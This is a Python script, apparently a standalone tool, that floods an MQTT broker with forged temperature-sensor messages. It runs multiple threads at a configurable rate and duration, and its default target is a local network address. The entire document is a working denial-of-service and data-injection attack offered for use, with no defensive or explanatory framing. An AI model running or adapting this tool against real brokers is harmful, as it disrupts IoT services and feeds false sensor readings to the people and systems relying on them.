import paho.mqtt.client as mqtt
import json
import time
import threading
import argparse
from datetime import datetime
def dos_attack(broker, port, topic, duration=30, rate=100, threads=4):
    print(f"Starting DoS attack on {broker}:{port}")
    print(f"Duration: {duration}s, Rate: {rate} msg/s/thread, Threads: {threads}")
    print(f"Total rate: {rate * threads} msg/s")
    def attack_thread(thread_id):
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"dos-attacker-{thread_id}")
        try:
            client.connect(broker, port)
            client.loop_start()
        except Exception as e:
            print(f"[ERROR] Thread {thread_id} failed to connect: {e}")
            return
        start_time = time.time()
        count = 0
        end_time = start_time + duration
        while time.time() < end_time:
            # Генерация фальшивого сообщения
            payload = json.dumps({
                "fake_sensor": f"dos-{thread_id}",
                "temperature": random.uniform(-50, 150),
                "timestamp": time.time(),
                "sequence": count
            })
            try:
                client.publish(topic, payload)
                count += 1
            except:
                pass
            time.sleep(1.0 / rate)
        client.loop_stop()
        client.disconnect()
        print(f"Thread {thread_id} finished. Sent {count} messages.")
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=attack_thread, args=(i,))
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()
    print("DoS attack completed")
def main():
    parser = argparse.ArgumentParser(description="MQTT DoS Attack Tool")
    parser.add_argument("--broker", default="192.168.0.156", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--topic", default="sensors/temperature", help="MQTT topic")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--rate", type=int, default=100, help="Messages per second per thread")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads")
    args = parser.parse_args()
    dos_attack(args.broker, args.port, args.topic, args.duration, args.rate, args.threads)
if __name__ == "__main__":
    import random
    main()